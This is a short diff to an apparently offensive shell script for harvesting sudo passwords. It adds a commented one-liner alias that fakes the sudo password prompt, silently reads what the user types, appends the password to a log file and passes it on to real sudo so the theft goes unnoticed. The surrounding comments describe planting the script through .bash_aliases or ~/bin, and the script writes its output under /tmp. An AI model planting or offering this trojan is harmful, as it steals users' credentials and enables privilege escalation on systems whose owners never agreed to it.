@@ -3,6 +3,10 @@
 # If you can modify a users .bash_aliases, you can alias sudo to this
 # If you can drop a file in ~/bin (and that's at the start of a users path), you can put this there.
 # Read the comments because certain quirks work if it's an alias vs if it's in ~/bin
+#
+# from noproto:
+# alias sudo='echo -n "[sudo] password for $USER: ";stty -echo;read passwd;stty echo;echo;echo $passwd|tee -a pwlog|sudo -S -p ""'
+#
 
 user=$(whoami)
 outPath=/tmp/01234-9876-ABEEFC0
